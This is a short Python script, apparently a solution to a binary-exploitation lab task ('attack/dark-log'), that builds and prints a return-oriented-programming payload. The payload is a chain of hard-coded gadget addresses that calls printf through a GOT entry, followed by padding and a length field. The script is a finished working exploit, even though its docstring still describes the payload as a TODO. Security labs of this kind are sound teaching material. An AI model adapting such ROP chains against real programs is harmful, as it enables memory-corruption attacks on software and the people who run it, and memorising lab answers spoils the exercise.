#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
p=lambda x:x.to_bytes(8,'little')
POP6=0x40189a
CALLF=0x401880
G_PRINTF=0x602028
FMT=0x4018c8
TAIL=0x401811

chain=p(POP6)
chain+=p(0)+p(1)+p(G_PRINTF)+p(FMT)+p(0x41)+p(0)
chain+=p(CALLF)
chain+=b'\x00'*56
chain+=p(TAIL)
assert len(chain)==128

payload = chain+b'B'*128+(0xa8).to_bytes(4,'little')+b'\n'

sys.stdout.buffer.write(payload)
